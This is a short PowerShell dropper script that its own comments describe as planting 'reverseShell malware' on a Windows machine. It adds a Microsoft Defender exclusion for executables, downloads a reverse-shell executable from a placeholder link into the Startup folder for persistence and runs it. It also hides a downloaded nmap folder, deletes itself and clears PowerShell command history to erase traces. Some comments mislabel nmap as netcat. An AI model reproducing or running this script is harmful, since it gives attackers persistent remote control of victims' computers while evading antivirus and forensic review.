Set-Location C:\Users\Public\Documents\ #Go to puclib documents directory
Invoke-WebRequest https://nmap.org/dist/nmap-7.92-win32.zip -o nmap.zip #Download netcat
Expand-Archive nmap.zip nmap #Unzip netcat zip
$FILE=Get-Item nmap -Force #Make nmap directory hidden
$FILE.Attributes='hidden' #Make nmap directory hidden
Remove-Item nmap.zip #Delete nmap.zip file
Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup #Go to startup directory to make our reverseShell malware persistent
Add-MpPreference -ExclusionExtension exe -Force
Invoke-WebRequest LINK -o reverseShell.exe #Download the reverseShell malware
Start-Process reverseShell.exe #Start the malware
Set-ExecutionPolicy Restricted -Force #Reset script blocker
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
Clear-Content (Get-PSReadLineOption).HistorySavePath #Clear powershell command history
exit
